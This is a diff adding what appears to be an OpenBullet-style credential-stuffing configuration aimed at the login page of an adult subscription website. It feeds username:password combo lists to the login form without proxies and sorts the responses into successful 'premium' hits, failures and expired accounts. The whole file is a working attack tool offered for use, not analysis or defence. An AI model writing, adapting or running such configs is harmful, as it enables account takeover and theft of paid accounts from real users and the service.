@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "AllJapanesePass + Proxyless",
+  "SuggestedBots": 3,
+  "LastModified": "2018-08-29T00:24:44.7130762+00:00",
+  "AdditionalInfo": "Only premiun hits capture",
+  "Author": "PaparazziTeam",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#UR1 REQUEST GET "https://alljapanesepass.com/login/?path=Lw" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#URL2 REQUEST POST "https://alljapanesepass.com/login/?path=Lw" AutoRedirect=TRUE 
+  CONTENT "login=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://alljapanesepass.com/login/?path=L" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+  KEYCHAIN Failure OR 
+    KEY "Wrong login or password." 
+    KEY "g-recaptcha" 
+    KEY "Your account is temporary blocked!" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Your account was expired." 
